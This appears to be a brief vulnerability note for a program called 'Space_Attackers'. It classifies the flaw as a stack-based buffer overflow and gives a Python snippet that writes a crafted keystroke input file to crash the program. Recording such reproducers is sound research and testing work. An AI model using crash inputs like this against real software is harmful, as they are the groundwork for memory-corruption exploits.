# Space_Attackers

## Type

Stack based buffer overflow.

## Crash

```python
with open('input', 'wb') as f:
    f.write('magic\n' + ('\n\n\n\nd\n' * 24) + ('\n' * 16) + ((('w\n' * 10) + 's\n') * (280)) + 's\n' + 'd\n' + 'q\n')
```
